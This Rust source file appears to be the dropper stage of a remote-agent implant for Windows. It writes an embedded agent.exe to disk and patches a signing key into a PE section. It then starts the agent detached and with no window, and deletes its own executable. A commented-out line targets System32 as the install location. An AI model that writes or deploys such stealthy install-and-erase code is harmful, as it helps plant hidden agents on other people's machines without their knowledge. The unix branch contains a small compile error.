// #![windows_subsystem = "windows"]
use std::{fs::OpenOptions, os::windows::process::CommandExt, path::Path};

use common::crypto;
use memmap2::MmapOptions;
use object::{File, Object, ObjectSection};

const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;
const DETACHED_PROCESS: u32 = 0x00000008;
const CREATE_NO_WINDOW: u32 = 0x08000000;

fn get_section(file: &File, name: &str) -> Option<(u64, u64)> {
    file.sections()
        .find(|section| section.name() == Ok(name))
        .map(|section| section.file_range())
        .flatten()
}

fn set_secret_key<P: AsRef<Path>>(
    path: P,
    section_name: &str,
    secret_key: &[u8; crypto::ED25519_SECRET_KEY_SIZE],
) -> Result<(), Box<dyn std::error::Error>> {
    let file = OpenOptions::new().read(true).write(true).open(path)?;
    let mut buf = unsafe { MmapOptions::new().map_mut(&file) }?;
    let file = File::parse(&*buf)?;

    if let Some((offset, size)) = get_section(&file, section_name) {
        assert_eq!(size, crypto::ED25519_SECRET_KEY_SIZE as u64);
        let base = offset as usize;
        buf[base..(base + crypto::ED25519_SECRET_KEY_SIZE)].copy_from_slice(secret_key);
    }
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(unix)]
    {
        eprintln!("This platform is not supported");
        return;
    }

    #[cfg(debug_assertions)]
    let bin = include_bytes!("../../target/x86_64-pc-windows-gnu/debug/agent.exe");
    #[cfg(not(debug_assertions))]
    let bin = include_bytes!("../../target/x86_64-pc-windows-gnu/release/agent.exe");

    // let target = "C:\\Windows\\System32\\agent.exe";
    let target = "agent.exe";
    let section_name = "secret_key";

    std::fs::write(target, bin)?;
    set_secret_key(target, section_name, crypto::get_signing_key().as_bytes())?;

    std::process::Command::new("cmd")
        .creation_flags(CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS | CREATE_NO_WINDOW)
        .args(&["/C", "start", target])
        .spawn()?;

    self_replace::self_delete()?;
    Ok(())
}
